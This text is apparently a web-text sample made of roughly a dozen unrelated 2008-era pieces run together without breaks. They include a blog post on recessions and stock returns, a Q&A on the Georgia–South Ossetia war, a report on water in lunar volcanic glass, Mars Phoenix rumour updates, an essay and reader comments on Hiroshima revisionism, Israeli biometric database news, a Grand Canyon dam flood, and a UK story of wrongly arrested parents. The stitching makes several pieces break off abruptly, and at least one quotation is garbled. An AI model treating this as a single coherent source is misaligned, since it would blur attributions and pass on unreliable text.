Well , looking back through history ( from the 1950 ’s ) and at how the stock market has behaved during some of these periods , I can see that the 16 month recession triggered by the global oil crisis in the early 1970 ’s as relatively being the harshest and having the most devastating effect on the average investment portfolio .
Here are some statistics from Vanguard showing how the S&P index has performed during economic slumps :
Recession Nominal S&P 500 Return Real S&P 500 Return * July 1953 –May 1954 23.63 % 23.10 % August 1957 – April 1958 – 1.31 % – 3.64 % April 1960 –February 1961 20.04 % 19.02 % December 1969 – November 1970 – 1.92 % – 6.96 % November 1973 –March 1975 – 7.79 % – 22.82 % January –July 1980 9.53 % 3.64 % July 1981 –November 1982 14.22 % 7.11 % July 1990 – March 1991 7.89 % 4.59 % March–November 2001 – 0.90 % – 1.70 %
* Adjusted for inflation using the Consumer Price Index .
Data sources : Vanguard and the National Bureau of Economic Research .
While business commentary typically defines a recession as two consecutive quarters of negative real growth gross domestic product , the National Bureau of Economic Research ( NBER ) is the recognized arbiter of U.S. recession dates .
The NBER has identified nine recessions in the U.S. since 1953 , with an average duration of 11 months .
These numbers can give you some perspective on how your portfolio may behave during recessionary conditions .
Despite the grim mood that recessions can evoke , the positive takeaway here is that the general long - term stock market trend is UP .
Other insightful words about the relationship between economic cycles and the stock market come from Joseph Davis , Ph.D. ( a principal and economist for Vanguard ’s Investment Counseling & Research ( IC&R ) and Fixed Income Groups ) :
Just as recessions have n’t always heralded a bear market for stocks , periods of economic growth have n’t always been accompanied by major gains on Wall Street .
Vanguard IC&R research has found that the average monthly return on the S&P 500 has been higher during economic expansions than during recessions ( 1.05 % versus 0.76 % ) , but the difference is not statistically significant statistical noise , ” Mr. Davis suggested .
Perhaps less surprising , stock market volatility has been significantly higher during recessions , as risk premiums rise during periods of economic uncertainty .
“ The primary reason there has n’t been a strong relationship between recessions and stock market returns comes down to timing , ” Mr. Davis said .
“ It ’s inherently difficult for equity investors to ‘ time the economy ’ by getting out of — or back into — the stock market at just the right moment . ”
Sounds to me that this is just one more argument for avoiding drastic changes to your investment strategy or portfolio as a knee - jerk response to economic tidal shifts .
Ack !
We ’re In A Slump !
So What Can I Do ?
Even with the existing coverage I ’ve done on this subject , plus the healthy list of stock investing tips I ’ve gathered in earlier posts such as the following :
I do n’t feel I ’ve quite wrung everything I can about this topic just yet , so I ’m sure I ’ll have much more to say about this later on .
For now I ’m hoping this compilation helps you a little .
I ’ll close by saying that recessions are part of the natural scheme of things , just like bad hair days , ant infestations and ugly weather .
But if you ’ve braced yourself for it , are flexible enough to go with the flow and think far enough ahead , you ’ll realize just how quickly even unfavorable times fly by .

Link : Nirvana out of American reach | The Australian .
THE energy , financial and political woes that grip the US signal a decisive shift in world power , mocking the liberal delusion that Barack Obama or John McCain can return American prestige and power to its pre-Bush year 2000 nirvana .
There is no such nirvana .
There is instead a new reality : the greatest transfer of income in human history , away from energy importers such as the US to energy exporters ; the rise of a new breed of wealthy autocracies that cripple US hopes of dominating the global system ; and demands on the US to make fresh compromises in a world where power is rapidly being diversified .
Far from the Obama - McCain contest being America ’s saviour , it has another dimension entirely : evidence of the generic failure of the US political system .
The US struggles but seems unable to confront the world that exists .
It slips into pessimism while fooling itself another irresistible revival is just around the corner .
But the structural trends offer a different conclusion .
Despite cyclical fluctuations , world oil and energy prices will stay high , driven by long - run changes in supply and demand .
This provokes a global wealth redistribution without precedent to oil exporters , mainly in the Middle East and Russia , that marches in tandem with China ’s export - driven current account surplus .
It is an extensive transfer of economic power away from the US to nations that are not mainly democracies , a dynamic that is the subject of agonising review in seminars and debates in the US … .
Fighting in Georgia 's breakaway region of South Ossetia in August caused dozens - possibly hundreds - of deaths and widespread destruction .
Georgian , Russian and South Ossetian forces were all involved .
There were also clashes in Abkhazia , and Russian attacks on other parts of Georgia .
The separatist administrations in South Ossetia and Abkhazia have been trying to gain formal independence since breaking away in the early 1990s .
Russia has now recognised them as independent - a move condemned by Western nations .
Tensions in both regions began to escalate after Mikheil Saakashvili was elected Georgian president in 2004 , on a promise to re-unite the country .
The conflicts had remained largely frozen , despite occasional flare - ups , before August 2008 .
What triggered the crisis ?
A series of clashes between Georgian and South Ossetian forces in the summer of 2008 prompted Georgia to launch an aerial bombardment and ground attack on South Ossetia on 7 August .
Georgian forces controlled the South Ossetian capital , Tskhinvali , for part of the following day .
Russia , meanwhile , poured thousands of troops into South Ossetia , and launched bombing raids both over the province and on targets in the rest of Georgia .
There have been unverified reports of war crimes on both sides .
Did the Russian forces enter South Ossetia before or after the Georgian attack ?
This is unclear .
Georgia says it began its assault after learning that a large convoy of Russian armour was coming through the Roki tunnel , from North Ossetia into South Ossetia .
Russia says it acted to defend Russian citizens in South Ossetia , and its own peacekeepers stationed in the breakaway region .
How did the conflict develop ?
Russian forces occupied parts of Georgia adjoining South Ossetia , including the town of Gori , a strategic town on the main road linking eastern and western Georgia .
They also moved from bases in Abkhazia into parts of western Georgia , and the Russian fleet went into action against the Georgian navy .
Abkhaz forces recaptured the Kodori Gorge - a region of Abkhazia taken by Georgian troops in 2006 .
Who are the main casualties ?
Large numbers of civilians were driven out of their homes in South Ossetia .
Many South Ossetians crossed over to the Russian republic of North Ossetia .
Residents of Georgian villages in South Ossetia , and the town of Gori , also fled .
The heavy fighting left the South Ossetian capital , Tskhinvali , largely in ruins .
Why is Russia involved ?
More than half of South Ossetia 's 70,000 citizens are said to have taken up Moscow 's offer of Russian citizenship .
Russia says its actions were designed to protect those citizens .
Russia also had peacekeepers based in South Ossetia .
Some of these were killed in the Georgian attack on 7 August .
Until recently , Russia said it respected Georgia 's territorial integrity , and only wanted to look out for Russian citizens .
But , following Georgia 's military action , Russia recognised the independence of both South Ossetia and Abkhazia on 26 August .
The US and France were swift to condemn Russia 's move , calling it " regrettable , " while the the UK categorically rejected it .
Nato said the declaration violated numerous UN Security Council resolutions that Russia itself had endorsed .
Russia has also signed friendship treaties with the breakaway regions , formalising diplomatic ties and pledging military assistance .
Does Georgia have links to Nato ?
President Saakashvili has made membership of Nato one of his main goals - and Nato agreed in April 2008 that Georgia would become a member of the alliance at some unspecified date in the future .
The country has had a close relationship with the United States - sending troops to join the US - led coalition in Iraq .
The US has helped to train and arm the Georgian military .
It also helped Georgian troops return from Iraq after the Russian incursion into South Ossetia .
What is the status of South Ossetia ?
South Ossetia has run its own affairs since fighting for independence from Georgia in 1991 - 92 , in the aftermath of the collapse of the Soviet Union .
Like the other breakaway region , Abkhazia , it declared its independence - but so far only Russia and Nicaragua have recognised them .
Why do Ossetians want to break away ?
The Ossetians are a distinct ethnic group originally from the Russian plains just south of the Don river .
In the 13th Century , they were pushed southwards by Mongol invasions into the Caucasus mountains , settling along the border with Georgia .
South Ossetians want to join up with their ethnic brethren in North Ossetia , which is an autonomous republic within the Russian Federation .
Ethnic Georgians are a minority in South Ossetia , accounting for less than one - third of the population .
But Georgia rejects even the name South Ossetia , preferring to call it by the ancient name of Samachablo , or Tskhinvali , after its main city .
Are tensions over energy supplies a factor in the conflict ?
A Western - sponsored pipeline has been pumping Caspian oil from Azerbaijan through Georgia to Turkey 's Mediterranean coast .
The Baku - Tbilisi - Ceyhan ( BTC ) pipeline can deliver up to 1.2 million barrels per day ( b/d ) of oil to Western markets .
But the flow has been suspended since an explosion on part of the line in eastern Turkey in August .
The Georgia conflict has delayed a resumption of deliveries .
A smaller oil export pipeline runs from Azerbaijan to Georgia 's Black Sea port of Supsa .
There are plans for another pipeline to take natural gas from Azerbaijan and Central Asia , via Turkey to Austria .
The EU and US are anxious to diversify their energy sources , to avoid being too dependent on supplies transiting through Russia .
Moscow already controls an oil export pipeline running from the Caspian to the Black Sea via the North Caucasus .
Russian troops did not try to seize the BTC pipeline - and Moscow did not highlight energy as an issue in the conflict .
But fears of instability in the Caucasus have made Western leaders and investors reassess their reliance on the region 's energy sources .
How has the international community responded to the conflict ?
The US has expressed solidarity and backing for Georgia , calling Russia 's actions " an illegitimate , unilateral attempt to change the country 's borders by force " .
On a trip to Georgia , US Vice - President Dick Cheney said Russia 's actions had cast " grave doubt " on the country 's reliability as a partner within the international system .
Georgia 's European neighbours have been somewhat more divided over how to react to the crisis at their heart .
At an emergency summit in Brussels , some member states pushed for sanctions against Russia , seeking to isolate the country .
In the end , the EU condemned Russia 's actions , called for it to meet the terms of the French - brokered ceasefire and suspended talks on a new partnership agreement with the bloc .
The US has pledged to provide a $ 1bn ( £ 564 m ) aid package for reconstruction , resettlement and humanitarian needs .
The IMF too has agreed in principle to give Georgia a $ 750 m ( £ 422 m ) loan to help repair the conflict 's damage .
What are EU observers doing in Georgia ?
The European Union has sent more than 200 observers to Georgia , in line with a 12 August ceasefire deal brokered by French President Nicolas Sarkozy .
Their operation began on 1 October and their mission 's initial duration is one year .
The unarmed observers , from 22 EU countries , are working in close co-ordination with the United Nations and the European security body , the OSCE .
One of their key tasks was to monitor the Russian troop withdrawal from " security zones " established by Russia around South Ossetia and Abkhazia .
Russia completed its troop pull - out as promised by 10 October , but it plans to keep nearly 8,000 troops in Abkhazia and South Ossetia .
Russia has refused to let the monitors enter the two breakaway regions .
The EU observers have the task of ensuring that the situation stabilises in the conflict zone , that human rights are not violated there and that internally displaced people can return home .
Their liaison work is aimed at confidence - building and an easing of tensions .
How does the conflict mark a change in Russia 's relations with the world ?
Russian intervention in Georgia has been followed by an explicit shift in the country 's foreign policy , laid out by the president .
Mr Medvedev has pledged to continue to defend the lives and dignity of its citizens , wherever they are located .
He said that while Russia does not seek isolation , and desires friendly relations with Europe and the US , it cannot accept a world order that places a single state - even the US - as sole global decision - maker .
Russia , he said , seeks to maintain privileged interests in its spheres of influence - including those bordering the country .

A new analysis of volcanic glass recovered from the moon decades ago found the rocks contain traces of the constituents of water , challenging a long - held notion that the moon is perfectly dry .
Using a technique that was not available when Apollo astronauts collected the minuscule rocks in the early 1970s , scientists were able to detect telltale signs of water trapped inside the pebble - like glass .
Their discovery suggests that water was present deep within the moon when the pebbles were formed during violent lunar eruptions 3.3 billion to 3.6 billion years ago .
The analysis , published Thursday in the journal Nature , may cause scientists to rethink theories on how the moon was formed .
“ The water that these guys have discovered is a scientific gold mine for us to figure out the history of . . . the moon , ” said Jim Garvin , chief scientist at NASA ’s Goddard Space Flight Center , who was not involved in the research .

The pebbles , about the size of a period on this page , are made of magnesium - rich green volcanic glass and iron - rich orange glass that solidified moments after eruption .
They were recovered from the moon ’s equatorial region during the Apollo 15 and Apollo 17 space missions .
Earlier studies of the pebbles detected the presence of sulfur and carbon , indicating the volcanic glass was formed in a fiery eruption .
For the latest study , scientists measured the composition of the diminutive rocks molecule by molecule , using a technique 10 times more sensitive than that used in previous work .
They did n’t search for water directly because when water is incorporated into any rock it naturally separates into smaller components .
So researchers looked for one of those components , hydrogen , which would signal the presence of water .
Testing the interior of the pebbles , scientists found trace amounts of hydrogen along with chlorine and fluorine , which , like carbon and sulfur , are found in rocks from explosive eruptions .
The discovery of hydrogen alongside the other elements suggests that the water came from inside the moon and not from an external source , such as a comet .

Based on the amount of hydrogen found in the pebbles , scientists estimated the lunar magma contained 260 to 745 parts per million of water , similar to what is found in the Earth ’s upper mantle .
“ Up until our study , there was really no evidence for [ indigenous ] water on the moon , ” said Erik Hauri , a staff scientist at the Carnegie Institution for Science and an author of the report .
The finding throws at least a little water on the currently favored hypothesis concerning the moon ’s origin .
Many scientists think the moon was formed when a large proto - planet slammed into Earth , sending into space molten debris that eventually became the moon .
Scientists have long assumed that the heat created by the collision would have vaporized any water present and that the small gravitational field of the primeval moon would not have been strong enough to recapture the vapor .
Researchers said they eliminated solar wind as a possible source of the hydrogen found in the tiny rocks .
Solar wind is a stream of charged particles , including hydrogen ions , that continually bombard the surface of the moon .
If hydrogen from the solar wind seeped into the pebbles , it could give a false reading of water .

But in such a case , “ you would expect high concentration on the surface which decreased toward the core , ” said Alberto Saal , assistant professor of geological sciences at Brown University and lead author of the report .
When Saal and colleagues analyzed a glass bead from its edge to its core , “ what we found was exactly the opposite , ” he said .
Some scientists think water may exist elsewhere on the moon .
Ice may have been deposited by external sources such as comets , Hauri said .
NASA plans to launch the Lunar Reconnaissance Orbiter this year to map the moon and look for surface water that could be hidden in permanently shadowed areas near the poles .

UPDATE 8/4 , 3:15 pm :
It appears that NASA will answer the rumors tomorrow at a press conference .
Do n't get your hopes up : the early information available suggests that the most likely outcome of the new data is to downgrade the habitability of Martian soil .
See our new post on the topic .
Rumors are flying this weekend that Mars Phoenix has made a major discovery relating to the potential for life on Mars .
Wired.com reached Sam Kounaves , the mission 's wet - chemistry lab lead , by cellphone this morning .
He quickly directed us to speak with NASA 's PR representatives , but not before he said , simply , " Rumors are rumors . "
They stem from an article in Aviation Week and subsequent pickup on Slashdot and elsewhere indicating that the White House had been briefed on the potential for life on the planet .
" The White House has been alerted by NASA about plans to make an announcement soon on major new Phoenix Lander discoveries concerning the " potential for life " on Mars , " wrote Craig Covault , citing anonymous sources on the Phoenix Lander 's wet - chemistry lab team .
Covault 's article showed some restraint , though , and made sure to note that " sources say the new data do not indicate the discovery of existing or past life on Mars . "
The subtleties , however , were quickly lost in the blogosphere , where excitement began to build that simple extraterrestrial life , or something suggesting its presence , had been found on Mars .
Late last night , @ MarsPhoenix ( aka Veronica McGregor , a NASA employee ) responded to the story , via the mission 's Twitter account .
" Heard about the recent news reports implying I may have found Martian life .
Those reports are incorrect , " she Tweeted .
" Reports claiming there was a White House briefing are also untrue and incorrect . "
Covault implies that a test in which Earth water was mixed with Martian soil is the cause of the excitement .
Mars Phoenix scientists have repeatedly stated that the lander does n't have the tools to directly detect life .
Over at LiveScience , David Leonard hints , without sourcing or attribution , that a paper on the work is going to come out in the journal Science .
" The reason that all this seems so hush - hush is due to a future paper and press release that appears likely to pop out of the American Association for the Advancement of Science ( AAAS ) and its Science magazine , " Leonard writes .
" Whatever the poop is from the scoop that ’s been studied by Phoenix , that information is purportedly going through peer - review . "
We 're still trying to get to the bottom of this story and will keep you updated with any new developments .
UPDATE # 2 Monday , 11:02 am :
We contacted the president 's science advisor 's office and his spokesperson , Kristin Scuderi , said , " No one was briefed by NASA about any science reports from the Mars Phoenix team . "
She referred specifically to John Marburger , the director of the Office of Science and Technology Policy , and Richard Russell , the organization 's associate director .
There is another denial out now on Space.com from Peter Smith , the mission 's lead , who called the information about a White House briefing " bogus and damaging . "
( Damaging to whom , one wonders . )
In a subsequent email Smith said that he did n't know " where this information came from . "
Craig Covault , the veteran space writer who authored the original article in Aviation Week , is sticking by his story .
Also , over at the Discovery Channel 's Space Disco blog , Dave Mosher reports that a Mars Phoenix scientist , Chris Hecht , emailed him about the rumors .
" There is likely to be a press release to address them , possibly as soon as tomorrow , " the scientist wrote .
So , the story is n't over , but it 's not any clearer , either .
UPDATE # 1 Sunday , 12:10 pm : Check out the forum discussion taking place onunmannedspaceflight.com .
There is a lot of commentary about how Covault did his reporting and what kinds of discoveries the Phoenix Lander 's various instruments are capable of making .
( Hat tip to NASA Watch 's Keith Cowing for pointing them out . )

The Greatest Hoax In American History : Japan ’s Alleged Willingness to Surrender During the Final Months of World War II
Mr. Maddox , Professor of History Emeritus at Pennsylvania State University , is the editor of " Hiroshima in History : The Myths of Revisionism " ( University of Missouri Press , May 2007 ) .
A staple of Hiroshima Revisionism has been the contention that the government of Japan was prepared to surrender during the summer of 1945 , with the sole proviso that its sacred emperor be retained .
President Harry S. Truman and those around him knew this through intercepted Japanese diplomatic messages , the story goes , but refused to extend such an assurance because they wanted the war to continue until atomic bombs became available .
The real purpose of using the bombs was not to defeat an already - defeated Japan , but to give the United States a club to use against the Soviet Union .
Thus Truman purposely slaughtered hundreds of thousands of Japanese , not to mention untold thousands of other Asians and Allied servicemen who would perish as the war needlessly ground on , primarily to gain diplomatic advantage .
One might think that compelling substantiation would be necessary to support such a monstrous charge , but the revisionists have been unable to provide a single example from Japanese sources .
What they have done instead amounts to a variation on the old shell game .
They state in their own prose that the Japanese were trying to surrender without citing any evidence and , to show that Truman was aware of their efforts , cite his diary entry of July 18 referring to a “ telegram from Jap Emperor asking for peace . ”
There it is !
The smoking gun !
But it is nothing of the sort .
The message Truman cited did not refer to anything even remotely resembling surrender .
It referred instead to the Japanese foreign office ’s attempt ( under the suspicious eyes of the military ) to persuade the Soviet Union to broker a negotiated peace that would have permitted the Japanese to retain their prewar empire and their imperial system ( not just the emperor ) intact .
No American president could have accepted such a settlement , as it would have meant abandoning the United States ’ most basic war aims .
An exchange I had with two revisionists , Martin Sherwin and Kai Bird , is revealing .
In the December 2007 issue of Passport ( newsletter of the Society for Historians of American Foreign Relations ) , I published a short critique of their Pulitzer Prize - winning American Prometheus : the Triumph and Tragedy of J. Robert Oppenheimer .
Among other things , I accused them of resorting to “ semantic jugglery ” in falsely equating Truman ’s diary reference to “ peace ” with “ surrender , ” and pointed out that they had failed to provide “ even a wisp of evidence ” that Japan was trying to surrender .
In their response , Sherwin and Bird in turn accused me of dismissing a “ huge body of distinguished scholarship , ” but again failed to include a single example of such evidence .
In particular , Sherwin and Bird berated me for failing to refer to Tsuyoshi Hasegawa ’s Racing the Enemy : Stalin , Truman , and the Surrender of Japan .
“ Hasegawa ’s research into Soviet and Japanese archives , ” they wrote , “ is replete with massive new and important ‘ wisps ’ of evidence about the causes of Japan ’s surrender .
It seems telling to us that his work is ignored . ”
What Sherwin and Bird apparently did not know , or hoped their readers did not know , was that although Hasegawa agreed with revisionists on a number of issues he explicitly rejected the early surrender thesis .
Indeed , Hasegawa in no uncertain terms wrote that “ Without the twin shocks of the atomic bombs and the Soviet entry into the war , the Japanese never would have surrendered in August . ”
So much for the “ massive new and important ‘ wisps ’ of evidence . ”
Undeterred by this fiasco and still unable to produce even a single document from Japanese sources , Bird has continued to peddle the fiction that “ peace ” meant the same thing as “ surrender . ”
In a mostly contemptuous review of Sir Max Hastings ’ s Retribution : The Battle for Japan , 1944 - 45 ( Washington Post Book World , April 20 , 2008 ) , Bird professed to be “ appalled by the critical evidence left out . ”
In passing he cited what he referred to as Hasegawa ’s “ widely praised ” book again , but only to note the latter ’s claim that Soviet entry into the war rather than the atomic bombs caused Japan ’s surrender .
There is no mention of the bogus “ massive new and important ‘ wisps ’ of evidence ” he and Sherwin earlier had claimed to find in Hasegawa ’s work .
Bird castigated Hastings because he “ ca n’t find the space to note that Truman , Secretary of State James F. Byrnes , and Adm. William D. Leahy , the president ’s chief of staff , all reportedly agreed on Aug. 3 , 1945 — three days before 140,000 civilians were killed in Hiroshima — that Japan was ‘ looking for peace . ’ ” Readers of this sentence who were unfamiliar with the sources — meaning practically all of them — could be expected to reach the false conclusion that Japan was trying to surrender .
In the last sentence of his review , Bird wrote that “ the bombings of Hiroshima and Nagasaki remain a hot - button issue , something that can make otherwise responsible historian nose - dive into polemics . ”
How true !

So in Maddox 's view , Hiroshima revisionism is the " Greatest Hoax in American History . "
Gee , what about white supremacy ?
No , the greatest hoax is the product of his naive , misleading , unscholarly " NEW LEFT " opponents who let their political agendas taint their views .
A fascinating display of academic professionalism and objectivity , Mr. Maddox !
Deus X Nihilo - 9/13/2010 " On July 20 , 1945 , under instructions from Washington , I went to the Potsdam Conference and reported there to Secretary Stimson on what I had learned from Tokyo – they desired to surrender if they could retain the Emperor and their constitution as a basis for maintaining discipline and order in Japan after the devastating news of surrender became known to the Japanese people . "
-- Allen Dulles , in his 1966 book " The Secret Surrender "
Nope , there 's not one single shred of evidence to support the revisionist case , is there ?
Oh , wait , I get it .
Dulles was driven by the same perverse desire to bite the government hand that feeds him as drove the authors of the US Government Strategic Bombing Survey .
Arnold Shcherban - 8/20/2010
The US and UK are the ones , as historical record clearly shows , initiated the imperialistic struggle for the hegemony in the Pacific and South - eastern Asia .
Japan has just played the opposite side of this struggle .
Not already mentioning the ominous role of T.Roosevelt and his government in early encouragement of Japanese imperialistic aggression .
So , spare us " the US above all and always right " absolutism .
MITCHELL G DAY - 5/12/2010 Mr. uh Head ,
It 's not Dr. Maddox claiming claiming the significance of an obscure semantic argument it 's the revisionists and he 's refuting it !
You seemed to have missed the point .
As far as the statements of the Japanese agressors to American interrogators concerning THEIR willingness to surrendor immediately AFTER the war but immediately BEFORE war crimes trials can , I think , be taken with more than ONE grain of salt !
The question is what was going on BEFORE the end of the war ?
For instance before the bomb were dropped and the Russians invaded Manchuria the Japanese had moved hundreds of thousands of troops to Kyushu island in order to oppose the projected American invasion ( to the point of actually OUTnumbering the slated American forces ! ) .
They had also gathered 3000 planes and trained pilots for their use in Kamikaze attacks .
Does n't sound to me like they were ready to surrender .
And that doe n't even take into account the attempted palace coup ( which failed as a result of the last American fire bombing raid of the war ! ) to prevent Hirohito from surrendering which took place AFTER the bombs were dropped and Russia got into the Pacific theater !
So much for the peaceful intentions of mass murdering Japanese Fascist imperialists !
MITCHELL G DAY - 5/12/2010 Ms. Paul , no he was n't !
JAPAN was guilty of a crime for prosecuting a mass murdering imperialist war of aggression against the U.S. , Australia , New Zealand , China , Korea , the Philippines , Great Britain and Holland !
MITCHELL G DAY - 5/12/2010 Mr. Beatty your chronology is faulty .
The Showa did n't make his decision to surrender until AFTER the dropping of the bombs !
Lorraine Paul - 5/6/2009
Truman was guilty of a war crime !
bit Head - 8/21/2008
The author has a valid point about the semantic games regarding the Japanese communication mentioning peace with Stalin , but referring to the long accepted notion in military circles that Japan would have surrendered before the end of the year without the use of nuclear bombs is plainly ludicrous , and based on a little more than a straw man argument .
That the Japanese were close to surrender was documented by the United Stated government shortly after the war :
" Based on a detailed investigation of all the facts , and supported by the testimony of the surviving Japanese leaders involved , it is the Survey 's opinion that certainly prior to 31 December 1945 , and in all probability prior to 1 November 1945 , Japan would have surrendered even if the atomic bombs had not been dropped , even if Russia had not entered the war , and even if no invasion had been planned or contemplated . "
Source : http://www.ibiblio.org/hyperwar/AAF/USSBS-PTO-Summary.html
Of course , to the author , that report played no role in later assessments of Japan 's likelihood of surrender .
None at all .
Also of no significance was the Soviet Union 's entry into the Pacific theater on August 9 .
The Soviet joining with the US against Japan was negotiated in Yalta in February of 1945 and known to the allies .
That , and the reallocation of 3700 b- 29 bombers to the pacific theater ( among other resources ) were why military analysts at the time were estimating Japan 's surrender before the end of the year .
All that information is curiously left out the picture .
One can suppose that the Soviet invasion of Japanese held territory and the reallocation of massive resources from the European theater to the pacific had nothing to do with the estimation of Japan 's pending surrender - supposedly everything hinges on an obscure semantic argument regarding one message .
The revisionists here is the author .
Stanley Lawrence Falk - 7/28/2008
The nasty tone of Bird 's review of Hastings may stem from the latter 's unequivocal statement that " The myth that the Japanee were ready to surrender anyway has been so comprehensively discredited by modern research that it is astonishing some writers continue to give it credence . " ( p. xix )
John D. Beatty - 7/28/2008 For Prof Bernstein :
Though the samurai were willing to die in place it it is not at all clear that ALL of Japan was ready for self - immolation .
The Showa became convinced that if all of Japan were destroyed his sacred duty to his ancestors , the protection of the sacred regalia , would be violated .
Deride this if you will , but HE believed it , and that 's ultimately all that matters .
D. M. Giangreco - 7/28/2008
Re " with the exception of Hasegawa " :
In the University of Missouri Press anthology that Maddox just edited , Hiroshima in History : The Myths of Revisionism , Maddox included Asada 's " The Shock of the Atomic Bomb and Japan 's Decision to Surrender -- A Reconsideration . "
Originally published in the November 1998 Pacific Historical Review , it won the AHA 's Lewis Knott Koontz Award .
Books by Asada , who recently retired from Doshisha University , Kyoto , include From Mahan to Pearl Harbor : The Imperial Japanese Navy and the United States ( US Naval institute Press , 2006 ) and Culture Shock and Japanese - American Relations : Historical Essays ( University of Missouri Press , 2007 ) .
His Japanese - American Relations Between the Wars( available in Japanese only ) won the pprestigious Yoshino Sakuzo Prize in 1994 .

The government approved Sunday a motion calling for the establishment of a biometric database by the Ministry of Interior and the Public Security Ministry .
The motion , dubbed the " identification card , travel papers and biometrics database bill , " will now be referred back to the various Knesset committees , which would ready it for its Knesset votes .
Advances First DNA database underway Itzik Saban Police launches pilot program to create Israel 's first ever DNA database , expected to include 9,000 samples by end of 2008 .
Database will assist deadlocked investigations , says police First DNA database underway
The new bill called for embedding biometric data , such as fingerprints and computerized tags of facial features , in Israeli IDs and passports ; as well as for the establishment of a database which would include biometric data on all Israeli citizens .
The data would be used by the Ministry of Interior in its future plans to create " smart " , forgery - proof identification papers and passports ; and would also allow authorities to identify people who are not carrying any means of identification , especially in cases of a mass disaster , should the need to identify fatalities arise .
Internal Security Minister Avi Dichter told the government that the " need to create a unique ( physical ) bond between the person carrying an ID and the data which appears on it , is essential in order to fight the worldwide forgeries …
Should we succeed we would be able to create a nationwide database controlled , as it should be , by the State . "
' Database detrimental to civil rights '
The motion was carried despite the fierce objections of ministers who claim creating a biometrics database would be detrimental to civil rights , such as the right to privacy .
The Israeli Bar Association sent Justice Minister Daniel Friedmann a letter to that effect last week , in which it asked him to postpone the decision on the bill , pending the Bar 's further studying of the subject .
" Forming such a database would harm the citizens ' basic right to privacy , " read the letter ; adding that such a database would be at constant risk of being hacked into by hostile elements , and would make " potential criminals out of every law - abiding citizen . "
The existence of such a database – which includes every citizen – has yet to be sanctioned in any Western country , added the Bar .
The Israeli Association for the Protection of Privacy and the Association for Civil Rights in Israel have also expressed their objection to the bill .
PHOENIX – An earthen dam weakened by heavy rains broke near the Grand Canyon early today , flooding a tribal town and forcing officials to pluck hundreds of residents and campers from the gorge by helicopter .
No injuries were immediately reported .
The failure of the Redlands Dam caused some flooding in the village of Supai , where about 400 members of the Havasupai tribe live , said Grand Canyon National Park spokeswoman Maureen Oltrogge .
Heavy rain caused trouble even before the dam burst .
A private boating party of 16 people was stranded on a ledge at the confluence of Havasu Creek and the Colorado River on Saturday night after flood waters carried their rafts away , Oltrogge said .
The boaters were found uninjured and were being rescued from the canyon , whose floor is unreachable in many places except by helicopter .
Rescuers were trying to find visitors staying at the Supai Campground and escort them to safety , Oltrogge said .
Evacuees were being flown to a parking area 8 miles from Supai and bused to a Red Cross shelter in Peach Springs , about 60 miles southwest of Supai , the spokeswoman said .
A flash flood warning was in effect for the area until the early evening , and the National Weather Service in Flagstaff warned that more rain was possible .
Supai is on Havasu Creek about 30 miles northwest of Grand Canyon Village , a popular tourist area on the canyon ’s south rim .
The creek feeds the Colorado , which runs the length of the canyon .
The helicopters lifting residents out were from the National Park Service , the National Guard and the Arizona Department of Public Safety , Oltrogge said .
In 2001 , flooding near Supai swept a 2 - year - old boy and his parents to their deaths while they were hiking .
The Grand Canyon , usually packed with visitors during the summer , has been the traditional home of the Havasupai for centuries .

I also wanted to determine if pro-life organizations supported the most effective way to reduce abortion rates , which is increased contraception use .
If the organization was fine with they barrier methods , but not hormonal methods like the pill , I gave them " limited support for contraceptives " .
If it was " Natural Family Planning " but against all other forms , I put them in " anti-contraceptives " .
If they were opposed to one form of contraceptives , and did not address others , I put them in " opposed contraceptives " .
UPDATETo clarify , if a group gets put into " opposes contraceptive " it does not necessarily mean that they wish to criminalize it .
But , if an organization supports Pharmacists " right " to not dispense birth control , or if they said that contraceptives contribute to a " culture of death " or " a child - unfriendly environment " I put that in " opposes contraceptives " , even if they do n't speak to making it illegal .
UPDATE the SecondIn order to be more fair , I looked over the organizations again , and added whether or not they were against birth control , or whether or not they were against some types of contraceptives and did not address other ones .
I went over the ones that also did n't address contraceptives , and found some of them did actually oppose Emergency contraceptive , so they were added to the last list .

Parents held for murder of their son after paramedics ' failed to spot playground injury that killed him '
Lewis Urmston - Brown died hours after banging his head in a playground accident
When two - year - old Lewis Urmson - Brown died just hours after falling in a playground , his parents were left devastated .
But Michelle Urmson and Chris Brown suffered a double agony when , a short time later , police wrongly accused them of killing their son .
They were arrested and led from their home in handcuffs before being locked in a cell .
The couple were released only after around 45 hours of questioning when officers determined their son's death had been a tragic accident .
Yesterday , the couple criticised paramedics who gave Lewis the all - clear without taking him to hospital .
He died eight hours later after suffering a suspected fit in his sleep .
Mr Brown , 41 , a security guard , said : ' Not only did our son die , but we were then accused of killing him and all because ambulance staff failed to do their job .
' If they had given him a decent examination , they would have realised he needed hospital treatment and he would still be alive .
' They did not examine him properly .
It was a two - minute job and they were off .
It was like it was all too much trouble and they could not wait to get away .
It 's an absolute outrage .
' Lewis should still be alive today , but instead he has gone and our lives are shattered . '
The accident happened at 7.30 pm last Sunday as Lewis was playing in a small park close to his home , in Runcorn , Cheshire .
After seeing him tumble off railings and bang his head , 39 - year - old Miss Urmson dialled 999 .
Paramedics examined Lewis but gave him the all - clear after deciding he did not need to go to hospital .
The couple , who also have a four - month - old son , put their children to bed as normal , but woke up in the early hours to find Lewis unconscious and frothing at the mouth .
He was taken to Warrington General Hospital , where he died a short time later .
Police arrived at their home at 6.30 am next day to arrest them .
Although Miss Urmson was released on police bail shortly before 8 pm , Mr Brown was forced to spend a night in the cells and was finally let out without charge at around 2 pm last Tuesday .
Miss Urmson 's bail has since been cancelled .
Fighting back tears , Miss Urmson , who has two older sons from previous relationships , said : ' I 'd only just learned I had lost my son , and the next minute I was being arrested on suspicion of killing him .
' I can't explain the horror of it .
It was a living nightmare .
My body went numb and I collapsed .
To think I could hurt my precious boy makes me feel physically sick . '
Mr Brown said the couple are planning to sue the ambulance service for alleged negligence .
' Lewis was such a loveable boy who always had a cheeky smile on his face , ' he added .
' He never had any health problems , this came completely out of the blue .
We were certain he was hurt in the accident .
' The paramedics could have done tests at the hospital and his internal injuries would have shown up and he could have got treatment to save his life .
' We have such terrible mixed emotions of sorrow and anger , firstly at the way Lewis was left to die and then because we were accused of killing our beautiful son .
It is criminal what they did . '
A spokesman for North West Ambulance Service said an investigation has been launched into this incident .
A Cheshire Police spokesman confirmed that no action is being taken against Miss Urmson or Mr Brown , and that a file has been passed to the coroner .
Jackson apologizes for comment about castrating Senator Obama David Edwards
Published : Wednesday July 9 , 2008
Print This Email This " See , Barack been ...um ... talking down to black people on this faith - based ... I wanna cut his nuts off . "
